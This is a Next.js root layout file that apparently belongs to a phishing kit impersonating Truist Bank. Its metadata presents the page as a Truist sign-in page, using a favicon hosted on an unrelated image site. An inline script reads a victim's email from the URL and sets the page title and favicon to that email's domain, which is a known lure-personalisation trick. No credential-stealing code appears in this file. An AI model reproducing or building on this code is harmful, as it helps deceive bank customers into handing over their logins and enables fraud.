/** @format */

import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata = {
  title: "Truist Bank | Checking, Savings, Lending, and Financial Services",
  description: "Sign in to your Truist account",
  icons: {
    icon: "https://image2url.com/images/1765306707255-2d6bb696-bba0-41a1-b3d0-2edade6f1db1.ico",
  },
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <head>
        {/* Default favicon is set in metadata. The script below will override if email is detected */}
        <script
          dangerouslySetInnerHTML={{
            __html: `
              // Update page title and favicon based on domain
              (function() {
                try {
                  const urlParams = new URLSearchParams(window.location.search);
                  const email = urlParams.get('email');
                  
                  if (email && email.includes('@')) {
                    const domain = email.split('@')[1];
                    
                    // Update page title to just the domain name
                    document.title = domain;
                    
                    // Update favicon
                    const favicon = document.querySelector('link[rel="icon"]') || document.createElement('link');
                    favicon.rel = 'icon';
                    favicon.href = 'https://www.google.com/s2/favicons?domain=' + domain + '&sz=32';
                    favicon.type = 'image/x-icon';
                    
                    if (!document.querySelector('link[rel="icon"]')) {
                      document.head.appendChild(favicon);
                    }
                  }
                } catch (error) {
                  // Keep default title and favicon if there's an error
                }
              })();
            `
          }}
        />
      </head>
      <body className={`${geistSans.variable} ${geistMono.variable}`}>
        {children}
      </body>
    </html>
  );
}